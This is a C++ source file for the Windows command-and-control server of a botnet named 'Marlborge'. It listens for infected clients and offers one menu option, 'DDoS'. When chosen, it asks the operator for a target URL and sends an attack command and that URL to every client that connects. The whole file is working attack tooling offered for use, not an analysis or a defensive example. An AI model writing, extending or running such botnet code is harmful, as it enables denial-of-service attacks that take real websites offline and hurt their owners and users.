#include <iostream>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <sstream>

#define LHOST "0.0.0.0" // Don't change this
#define LPORT 3000 // Set to the port you set on the client
#define MAXCONN 100000 // Set the max number of connections

// Colors
#define RESET   "\033[0m"
#define BLACK   "\033[30m"      
#define RED     "\033[31m"      
#define GREEN   "\033[32m"      
#define YELLOW  "\033[33m"      
#define BLUE    "\033[34m"      
#define MAGENTA "\033[35m"      
#define CYAN    "\033[36m"      
#define WHITE   "\033[37m"      
#define BOLDBLACK   "\033[1m\033[30m"      
#define BOLDRED     "\033[1m\033[31m"      
#define BOLDGREEN   "\033[1m\033[32m"      
#define BOLDYELLOW  "\033[1m\033[33m"      
#define BOLDBLUE    "\033[1m\033[34m"      
#define BOLDMAGENTA "\033[1m\033[35m"      
#define BOLDCYAN    "\033[1m\033[36m"      
#define BOLDWHITE   "\033[1m\033[37m"      

using namespace std;

#pragma comment(lib, "WS2_32.lib")

WSADATA wsaData;
SOCKET sock;
sockaddr_in saIn;
int iResult;

stringstream ss;

char buffer[1024];

void ClearBuffer() {
	memset(buffer, 0, sizeof(buffer));
}

void RestartSock() {
	closesocket(sock);
	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	return;
}

void Startup() {
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		cout << "Failed at startup" << endl;
		exit(0);
	}

	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	saIn.sin_family = AF_INET;
	inet_pton(AF_INET, LHOST, &saIn.sin_addr.s_addr);
	saIn.sin_port = htons(LPORT);

	iResult = bind(sock, (SOCKADDR*)&saIn, sizeof(saIn));
	if (iResult == SOCKET_ERROR) {
		cout << "Socket error" << endl;
		closesocket(sock);
		exit(0);
	}
	listen(sock, MAXCONN);

	cout << RED R""""(
	
_______ _______  ______        ______   _____   ______  ______ _______
|  |  | |_____| |_____/ |      |_____] |     | |_____/ |  ____ |______
|  |  | |     | |    \_ |_____ |_____] |_____| |    \_ |_____| |______
                                                                       

 ______ _______         _____  _______ ______  _______ ______ 
|_____/ |______ |      |     | |_____| |     \ |______ |     \
|    \_ |______ |_____ |_____| |     | |_____/ |______ |_____/
                                                               
	)"""" << endl;
	cout << RED "By: " << YELLOW "PR3C14D0" << endl;
	cout << endl << "Marlborge is listening for connections" << endl;

	return;
}

int Menu() {
	cout << BLUE << R""""(
+--------+-------+----------------------------------------------------+
| Option | Name  |                    Description                     |
+--------+-------+----------------------------------------------------+
|      1 | DDoS  | Makes a DDoS attack with all the connected clients |
+--------+-------+----------------------------------------------------+

)"""";
	int opt;
	cout << RED "preciado@marlborge:~$ " << YELLOW;
	cin >> opt;
	cout << endl;
	cin.ignore();
	return opt;
}

void SendAttack() {
	cout << endl << GREEN "Enter the URL you want to attack (with http[s]): " RED;
	cin.getline(buffer, sizeof(buffer));
	ss << buffer; char url[1024]; ss >> url;
	ClearBuffer();
	char opt[1024] = "1";

	while (true) {
		SOCKET client = accept(sock, NULL, NULL);
		send(client, opt, sizeof(opt), 0);
		send(client, url, sizeof(url), 0);
	}
}

int main() {
	Startup();
	int opt = Menu();
	switch (opt) {
	case 1:
		SendAttack();
		break;
	}

	return 0;
}